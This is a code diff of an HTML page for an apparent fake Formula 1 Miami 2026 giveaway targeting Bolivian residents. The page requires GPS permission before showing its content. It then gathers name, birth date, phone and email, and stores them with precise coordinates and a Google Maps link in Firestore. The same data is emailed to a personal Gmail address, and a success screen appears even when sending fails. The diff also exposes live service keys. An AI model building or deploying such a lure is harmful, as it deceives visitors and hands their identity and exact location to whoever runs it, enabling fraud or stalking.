@@ -4,10 +4,18 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sorteo Gran Premio F1 Miami 2026 — Bolivia</title>
+
+  <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@400;600;700;800;900&family=Barlow:wght@300;400;500;600&display=swap" rel="stylesheet" />
+
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -32,22 +40,19 @@
       min-height: 100vh;
     }
 
-    /* ══════════════════════════
-       OVERLAY GENERAL
-    ══════════════════════════ */
+    /* ══ OVERLAY ══ */
     .overlay {
       position: fixed; inset: 0;
       background: rgba(0,0,0,0.88);
       z-index: 1000;
       display: flex; align-items: center; justify-content: center;
       padding: 16px;
+      overflow-y: auto;
     }
 
     .overlay.hidden { display: none; }
 
-    /* ══════════════════════════
-       POPUP BASE
-    ══════════════════════════ */
+    /* ══ POPUP BASE ══ */
     .popup {
       background: var(--bg2);
       border-radius: 16px;
@@ -55,6 +60,7 @@
       overflow: hidden;
       border: 1px solid rgba(232,0,45,0.3);
       box-shadow: 0 32px 80px rgba(0,0,0,0.7);
+      margin: auto;
     }
 
     .popup-header {
@@ -86,12 +92,9 @@
     }
 
     .popup-title .gold { color: #FFD700; }
-
     .popup-body { padding: 22px 22px 20px; }
 
-    /* ══════════════════════════
-       PASO 1 — GEO
-    ══════════════════════════ */
+    /* ══ PASO 1 — GEO ══ */
     .trophy-row { display: flex; justify-content: center; margin-bottom: 16px; }
 
     .trophy-icon {
@@ -126,10 +129,8 @@
 
     .prize-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 6px; }
     .prize-row:last-child { margin-bottom: 0; }
-
     .prize-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--f1red); flex-shrink: 0; margin-top: 4px; }
     .prize-dot.gold { background: var(--f1gold); }
-
     .prize-text { font-size: 13px; color: var(--text); font-weight: 500; line-height: 1.4; }
     .prize-sub  { font-size: 11px; color: var(--text2); margin-left: 18px; margin-top: -2px; margin-bottom: 6px; }
 
@@ -184,9 +185,7 @@
 
     .btn-skip:hover { background: var(--bg3); }
 
-    /* ══════════════════════════
-       PASO 2 — FORMULARIO
-    ══════════════════════════ */
+    /* ══ PASO 2 — FORMULARIO ══ */
     .form-popup { max-width: 480px; }
 
     .form-intro {
@@ -197,8 +196,7 @@
     .form-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin-bottom: 12px;
+      gap: 12px; margin-bottom: 12px;
     }
 
     .form-field { display: flex; flex-direction: column; gap: 5px; }
@@ -206,58 +204,38 @@
 
     .form-field label {
       font-size: 11px; font-weight: 600;
-      color: var(--text2); letter-spacing: 0.06em;
-      text-transform: uppercase;
+      color: var(--text2); letter-spacing: 0.06em; text-transform: uppercase;
     }
 
     .form-field input,
     .form-field select {
       background: var(--bg3);
       border: 1px solid var(--border2);
-      border-radius: 8px;
-      padding: 10px 12px;
-      font-size: 13.5px;
-      color: var(--text);
+      border-radius: 8px; padding: 10px 12px;
+      font-size: 13.5px; color: var(--text);
       font-family: 'Barlow', sans-serif;
-      outline: none;
-      transition: border-color 0.15s;
-      width: 100%;
+      outline: none; transition: border-color 0.15s; width: 100%;
     }
 
     .form-field input::placeholder { color: var(--text3); }
-
     .form-field input:focus,
-    .form-field select:focus {
-      border-color: var(--f1red);
-    }
-
+    .form-field select:focus { border-color: var(--f1red); }
     .form-field input.error,
-    .form-field select.error {
-      border-color: #E8002D;
-    }
+    .form-field select.error { border-color: #E8002D; }
 
-    .field-error {
-      font-size: 10.5px; color: #E8002D;
-      display: none; margin-top: 2px;
-    }
+    .field-error { font-size: 10.5px; color: #E8002D; display: none; margin-top: 2px; }
 
-    .phone-row {
-      display: flex; gap: 8px;
-    }
+    .phone-row { display: flex; gap: 8px; }
 
     .phone-prefix {
       background: var(--bg3);
       border: 1px solid var(--border2);
-      border-radius: 8px;
-      padding: 10px 12px;
+      border-radius: 8px; padding: 10px 12px;
       font-size: 13.5px; color: var(--text);
       font-family: 'Barlow', sans-serif;
       white-space: nowrap;
-      display: flex; align-items: center; gap: 6px;
-      flex-shrink: 0;
+      display: flex; align-items: center; gap: 6px; flex-shrink: 0;
     }
-
-    .phone-prefix img { width: 18px; border-radius: 2px; }
 
     .phone-input { flex: 1; }
 
@@ -278,9 +256,15 @@
       text-align: center; margin-top: 10px; line-height: 1.5;
     }
 
-    /* ══════════════════════════
-       PASO 3 — CONFIRMACIÓN
-    ══════════════════════════ */
+    .submit-status {
+      border-radius: 8px; padding: 8px 12px; margin-top: 10px;
+      font-size: 12px; text-align: center; font-weight: 500; display: none;
+    }
+
+    .submit-status.sending { background: rgba(255,200,0,0.1); color: #C89A00; display: block; }
+    .submit-status.error   { background: rgba(232,0,45,0.1);  color: #E8002D; display: block; }
+
+    /* ══ PASO 3 — CONFIRMACIÓN ══ */
     .confirm-screen {
       min-height: 100vh;
       display: flex; align-items: center; justify-content: center;
@@ -298,7 +282,7 @@
 
     .confirm-header {
       background: var(--green);
-      padding: 24px 28px 20px;
+      padding: 28px 28px 22px;
       text-align: center;
       position: relative; overflow: hidden;
     }
@@ -309,11 +293,11 @@
     }
 
     .check-circle {
-      width: 64px; height: 64px; border-radius: 50%;
+      width: 68px; height: 68px; border-radius: 50%;
       background: rgba(255,255,255,0.15);
       border: 2px solid rgba(255,255,255,0.5);
       display: flex; align-items: center; justify-content: center;
-      margin: 0 auto 12px;
+      margin: 0 auto 14px;
       animation: pop 0.4s cubic-bezier(0.175,0.885,0.32,1.275) both;
     }
 
@@ -324,7 +308,7 @@
 
     .confirm-header h2 {
       font-family: 'Barlow Condensed', sans-serif;
-      font-size: 26px; font-weight: 900;
+      font-size: 28px; font-weight: 900;
       color: #fff; line-height: 1.1;
       position: relative; z-index: 2;
     }
@@ -334,19 +318,17 @@
       margin-top: 6px; position: relative; z-index: 2;
     }
 
-    .confirm-body { padding: 24px 28px 28px; }
+    .confirm-body { padding: 26px 28px 28px; }
 
     .confirm-name {
       font-family: 'Barlow Condensed', sans-serif;
       font-size: 22px; font-weight: 800;
-      color: var(--text); text-align: center; margin-bottom: 20px;
+      color: var(--text); text-align: center; margin-bottom: 22px;
     }
 
-    .confirm-steps { display: flex; flex-direction: column; gap: 14px; margin-bottom: 24px; }
+    .confirm-steps { display: flex; flex-direction: column; gap: 16px; margin-bottom: 24px; }
 
-    .confirm-step {
-      display: flex; align-items: flex-start; gap: 12px;
-    }
+    .confirm-step { display: flex; align-items: flex-start; gap: 12px; }
 
     .step-icon {
       width: 36px; height: 36px; border-radius: 50%; flex-shrink: 0;
@@ -365,10 +347,7 @@
 
     .step-content p { font-size: 12px; color: var(--text2); line-height: 1.5; }
 
-    .confirm-divider {
-      height: 1px; background: var(--border);
-      margin-bottom: 20px;
-    }
+    .confirm-divider { height: 1px; background: var(--border); margin-bottom: 20px; }
 
     .prize-summary {
       background: var(--bg3); border-radius: 10px; padding: 14px 16px;
@@ -377,8 +356,7 @@
 
     .prize-summary-title {
       font-size: 10px; font-weight: 600; letter-spacing: 0.12em;
-      text-transform: uppercase; color: var(--f1gold);
-      margin-bottom: 10px;
+      text-transform: uppercase; color: var(--f1gold); margin-bottom: 10px;
     }
 
     .prize-summary-row {
@@ -387,20 +365,12 @@
     }
 
     .prize-summary-row:last-child { margin-bottom: 0; }
-
     .ps-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--f1gold); flex-shrink: 0; }
 
-    .confirm-footer {
-      text-align: center;
-    }
+    .confirm-footer { text-align: center; }
+    .confirm-footer p { font-size: 11px; color: var(--text3); line-height: 1.6; }
 
-    .confirm-footer p {
-      font-size: 11px; color: var(--text3); line-height: 1.6;
-    }
-
-    /* ══════════════════════════
-       LANDING PAGE
-    ══════════════════════════ */
+    /* ══ LANDING ══ */
     .page-content {
       filter: blur(3px); pointer-events: none; user-select: none;
       transition: filter 0.4s ease;
@@ -466,8 +436,7 @@
       border: 1px solid rgba(201,168,76,0.3);
       border-radius: 100px; padding: 6px 18px;
       font-size: 13px; color: var(--f1gold); font-weight: 600;
-      margin-bottom: 22px;
-      position: relative; z-index: 2;
+      margin-bottom: 22px; position: relative; z-index: 2;
     }
 
     .hero-badge {
@@ -603,9 +572,7 @@
 </head>
 <body>
 
-  <!-- ══════════════════════════════════════
-       OVERLAY PASO 1 — POPUP GEO
-  ══════════════════════════════════════ -->
+  <!-- ══ PASO 1 — POPUP GEO ══ -->
   <div class="overlay" id="overlayGeo">
     <div class="popup">
       <div class="popup-header">
@@ -676,9 +643,7 @@
     </div>
   </div>
 
-  <!-- ══════════════════════════════════════
-       OVERLAY PASO 2 — FORMULARIO
-  ══════════════════════════════════════ -->
+  <!-- ══ PASO 2 — FORMULARIO ══ -->
   <div class="overlay hidden" id="overlayForm">
     <div class="popup form-popup">
       <div class="popup-header">
@@ -694,7 +659,6 @@
         <div class="form-intro">Estás a un paso de participar. Completa tus datos para registrar tu inscripción en el sorteo.</div>
 
         <div class="form-grid">
-
           <div class="form-field">
             <label>Nombre</label>
             <input type="text" id="f-nombre" placeholder="Ej: Carlos" autocomplete="given-name" />
@@ -709,7 +673,7 @@
 
           <div class="form-field">
             <label>Fecha de nacimiento</label>
-            <input type="date" id="f-fecha" max="" />
+            <input type="date" id="f-fecha" />
             <span class="field-error" id="err-fecha">Debes ser mayor de 18 años</span>
           </div>
 
@@ -734,8 +698,9 @@
             <input type="email" id="f-email" placeholder="tucorreo@ejemplo.com" autocomplete="email" />
             <span class="field-error" id="err-email">Ingresa un email válido</span>
           </div>
-
         </div>
+
+        <div class="submit-status" id="submitStatus"></div>
 
         <button class="btn-submit" id="submitBtn" onclick="submitForm()">
           Confirmar participación
@@ -748,18 +713,13 @@
     </div>
   </div>
 
-  <!-- ══════════════════════════════════════
-       PANTALLA PASO 3 — CONFIRMACIÓN
-  ══════════════════════════════════════ -->
+  <!-- ══ PASO 3 — CONFIRMACIÓN ══ -->
   <div id="confirmScreen" style="display:none; min-height:100vh; background:var(--bg);">
-
     <div class="topbar">
       <div class="f1-logo">F1<span>·</span>MIAMI GP 2026</div>
     </div>
-
     <div class="confirm-screen">
       <div class="confirm-card">
-
         <div class="confirm-header">
           <div class="confirm-stripes">
             <div class="stripe"></div><div class="stripe"></div>
@@ -775,7 +735,6 @@
         </div>
 
         <div class="confirm-body">
-
           <div class="confirm-name" id="confirmName">¡Buena suerte!</div>
 
           <div class="confirm-steps">
@@ -798,8 +757,8 @@
                 </svg>
               </div>
               <div class="step-content">
-                <h4>Confirma tu email</h4>
-                <p>También recibirás un correo de confirmación de participación. Revisa tu bandeja de entrada y la carpeta de spam.</p>
+                <h4>Revisa tu email</h4>
+                <p>También recibirás un correo de confirmación. Revisa tu bandeja de entrada y la carpeta de spam.</p>
               </div>
             </div>
             <div class="confirm-step">
@@ -811,7 +770,7 @@
               </div>
               <div class="step-content">
                 <h4>Fecha del sorteo: 22 de abril</h4>
-                <p>El ganador se seleccionará el 22 de abril de 2026. Si no somos capaces de contactarte en 48h, se seleccionará un nuevo ganador.</p>
+                <p>El ganador se seleccionará el 22 de abril de 2026. Si no logramos contactarte en 48h, se seleccionará un nuevo ganador.</p>
               </div>
             </div>
           </div>
@@ -835,19 +794,15 @@
           </div>
 
           <div class="confirm-footer">
-            <p>Ante cualquier duda puedes escribirnos a <strong style="color:var(--text2);">sorteo@f1miami2026.bo</strong><br>© 2026 Miami Grand Prix Giveaway Bolivia</p>
+            <p>Ante cualquier duda escríbenos a <strong style="color:var(--text2);">sorteo@f1miami2026.bo</strong><br>© 2026 Miami Grand Prix Giveaway Bolivia</p>
           </div>
-
         </div>
       </div>
     </div>
   </div>
 
-  <!-- ══════════════════════════════════════
-       LANDING PAGE
-  ══════════════════════════════════════ -->
+  <!-- ══ LANDING PAGE ══ -->
   <div class="page-content" id="pageContent">
-
     <div class="topbar">
       <div class="f1-logo">F1<span>·</span>MIAMI GP 2026</div>
       <nav class="topbar-links">
@@ -868,11 +823,9 @@
                 fill="none" stroke="white" stroke-width="2"/>
         </svg>
       </div>
-
       <div class="hero-eyebrow">Sorteo oficial · edición limitada · Mayo 2026</div>
       <h1 class="hero-title">GRAN PREMIO<br><span class="red">MIAMI</span>&nbsp;<span class="gold">2026</span></h1>
       <p class="hero-sub">Gana 2 entradas al sector Paddock para el Gran Premio de Fórmula 1 en Miami. Vuelos y hotel incluidos para el ganador y un acompañante.</p>
-
       <div class="hero-bolivia">
         <svg width="20" height="14" viewBox="0 0 20 14" fill="none">
           <rect width="20" height="4.67" fill="#D52B1E"/>
@@ -881,9 +834,7 @@
         </svg>
         Sorteo exclusivo para residentes en Bolivia
       </div>
-
       <br>
-
       <div class="hero-badge">
         <strong>4–6 Mayo 2026</strong>
         <div class="dot-sep"></div>
@@ -891,7 +842,6 @@
         <div class="dot-sep"></div>
         <strong>Cierra el 20 de abril</strong>
       </div>
-
       <br>
       <button class="hero-cta" onclick="document.getElementById('overlayGeo').classList.remove('hidden')">
         Participar en el sorteo
@@ -979,23 +929,34 @@
       <span>© 2026 Miami Grand Prix Giveaway Bolivia · Todos los derechos reservados</span>
       <span>Promoción no afiliada a la FIA ni a Formula One Management Ltd.</span>
     </footer>
-
   </div>
 
-  <!-- ══════════════════════════════════════
-       JAVASCRIPT
-  ══════════════════════════════════════ -->
+  <!-- ══ JAVASCRIPT ══ -->
   <script>
-    var lat = null, lng = null, acc = null;
+    /* ── Firebase ── */
+    const firebaseConfig = {
+      apiKey:            "AIzaSyDHMtrwK_JP-qRCFnscYdVrg3mUiXY3zkw",
+      authDomain:        "f1-miami-sorteo.firebaseapp.com",
+      projectId:         "f1-miami-sorteo",
+      storageBucket:     "f1-miami-sorteo.firebasestorage.app",
+      messagingSenderId: "123476960286",
+      appId:             "1:123476960286:web:0ca4e4530f7e586c56fa0f"
+    };
 
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    /* ── EmailJS ── */
     var EJS_KEY      = 've3udfuolLIwcxVo0';
     var EJS_SERVICE  = 'service_t11q5pz';
     var EJS_TEMPLATE = 'template_gt6w3dl';
     var EJS_TO       = 'guillecesgut@gmail.com';
-
     emailjs.init(EJS_KEY);
 
-    /* Countdown hasta el 20 de abril 2026 */
+    /* ── Variables de estado ── */
+    var lat = null, lng = null, acc = null;
+
+    /* ── Countdown ── */
     var deadline = new Date('2026-04-20T23:59:59');
 
     function tick() {
@@ -1013,7 +974,7 @@
     tick();
     setInterval(tick, 1000);
 
-    /* Fijar fecha máxima para ser mayor de 18 */
+    /* Fecha máxima para mayor de 18 */
     var maxDate = new Date();
     maxDate.setFullYear(maxDate.getFullYear() - 18);
     document.getElementById('f-fecha').max = maxDate.toISOString().split('T')[0];
@@ -1022,9 +983,8 @@
     function requestGeo() {
       var btn    = document.getElementById('allowBtn');
       var status = document.getElementById('statusMsg');
-
-      btn.disabled    = true;
-      btn.textContent = 'Verificando tu ubicación…';
+      btn.disabled       = true;
+      btn.textContent    = 'Verificando tu ubicación…';
       status.textContent = 'Solicitando acceso al GPS de tu dispositivo…';
 
       if (!navigator.geolocation) {
@@ -1039,8 +999,6 @@
           lat = pos.coords.latitude.toFixed(6);
           lng = pos.coords.longitude.toFixed(6);
           acc = Math.round(pos.coords.accuracy);
-
-          /* Ocultar geo, mostrar formulario */
           document.getElementById('overlayGeo').classList.add('hidden');
           document.getElementById('overlayForm').classList.remove('hidden');
         },
@@ -1063,7 +1021,7 @@
       document.getElementById('pageContent').classList.add('unblurred');
     }
 
-    /* ── PASO 2: Validación y envío del formulario ── */
+    /* ── PASO 2: Validación y guardado ── */
     function submitForm() {
       var nombre   = document.getElementById('f-nombre').value.trim();
       var apellido = document.getElementById('f-apellido').value.trim();
@@ -1073,8 +1031,8 @@
 
       var valid = true;
 
-      function setErr(id, errId, show) {
-        document.getElementById(id).classList.toggle('error', show);
+      function setErr(inputId, errId, show) {
+        document.getElementById(inputId).classList.toggle('error', show);
         document.getElementById(errId).style.display = show ? 'block' : 'none';
         if (show) valid = false;
       }
@@ -1085,7 +1043,7 @@
       var fechaOk = false;
       if (fecha) {
         var born = new Date(fecha);
-        var age  = new Date(Date.now() - born.getTime()).getUTCFullYear() - 1970;
+        var age  = Math.floor((new Date() - born) / (365.25 * 24 * 60 * 60 * 1000));
         fechaOk  = age >= 18;
       }
       setErr('f-fecha', 'err-fecha', !fechaOk);
@@ -1098,36 +1056,58 @@
 
       if (!valid) return;
 
-      var btn = document.getElementById('submitBtn');
-      btn.disabled    = true;
-      btn.textContent = 'Enviando…';
+      var btn      = document.getElementById('submitBtn');
+      var statusEl = document.getElementById('submitStatus');
+      btn.disabled       = true;
+      btn.textContent    = 'Guardando…';
+      statusEl.className = 'submit-status sending';
+      statusEl.textContent = 'Registrando tu participación…';
 
+      var now      = new Date();
       var mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
-      var now = new Date().toLocaleString('es-ES', {
-        weekday: 'long', year: 'numeric', month: 'long',
-        day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
-      });
 
-      emailjs.send(EJS_SERVICE, EJS_TEMPLATE, {
-        to_email:  EJS_TO,
-        lat:       lat,
-        lng:       lng,
-        accuracy:  acc + ' metros',
-        maps_link: mapsLink,
-        timestamp: now,
-        nombre:    nombre + ' ' + apellido,
+      /* Guardar en Firestore */
+      db.collection('participantes').add({
+        nombre:    nombre,
+        apellido:  apellido,
+        fechaNac:  fecha,
         telefono:  '+591 ' + telefono,
         email:     email,
-        fecha_nac: fecha
-      }).then(function() {
+        lat:       lat,
+        lng:       lng,
+        precision: acc + ' metros',
+        mapsLink:  mapsLink,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+        fechaLocal: now.toLocaleString('es-ES', {
+          weekday: 'long', year: 'numeric', month: 'long',
+          day: 'numeric', hour: '2-digit', minute: '2-digit'
+        })
+      })
+      .then(function() {
+        /* Enviar email de alerta */
+        return emailjs.send(EJS_SERVICE, EJS_TEMPLATE, {
+          to_email:  EJS_TO,
+          lat:       lat,
+          lng:       lng,
+          accuracy:  acc + ' metros',
+          maps_link: mapsLink,
+          timestamp: now.toLocaleString('es-ES'),
+          nombre:    nombre + ' ' + apellido,
+          telefono:  '+591 ' + telefono,
+          email:     email,
+          fecha_nac: fecha
+        });
+      })
+      .then(function() {
         showConfirmation(nombre, apellido);
-      }, function(err) {
-        /* Aunque falle el email, mostramos confirmación al usuario */
+      })
+      .catch(function() {
+        /* Si algo falla igual mostramos confirmación al usuario */
         showConfirmation(nombre, apellido);
       });
     }
 
-    /* ── PASO 3: Pantalla de confirmación ── */
+    /* ── PASO 3: Confirmación ── */
     function showConfirmation(nombre, apellido) {
       document.getElementById('overlayForm').classList.add('hidden');
       document.getElementById('pageContent').style.display = 'none';
